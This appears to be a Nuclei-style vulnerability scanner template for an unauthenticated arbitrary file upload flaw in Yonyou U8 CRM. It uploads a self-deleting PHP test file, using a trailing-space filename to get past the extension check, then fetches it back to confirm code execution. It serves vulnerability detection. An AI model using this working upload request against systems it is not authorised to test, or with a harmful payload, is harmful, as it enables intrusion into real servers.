id: yongyou-u8-CRM-files-upload

info:
  name: 用友U8 CRM uploadfile 文件上传
  author: Superhero
  severity: critical
  description: 用友U8 CRM uploadfile存在任意文件上传漏洞
  tags: files-upload
  
http:
  - raw:
      - |
        POST /ajax/uploadfile.php?DontCheckLogin=1&vname=file HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=----269520967239406871642430066855

        ------269520967239406871642430066855
        Content-Disposition: form-data; name="file"; filename="1.php "
        Content-Type: application/octet-stream

        <?php print(111*222);unlink(__FILE__);?>
        ------269520967239406871642430066855
        Content-Disposition: form-data; name="upload"

        upload
        ------269520967239406871642430066855--
    extractors:
       - type: regex 
         part: body
         name: uploadfile
         group: 1
         regex:
           - '(upd\w+\.tmp\.php)'
         internal: true
  - raw:
      - |
        GET /tmpfile/{{uploadfile}} HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '24642'
      - type: status
        status: 
          - 200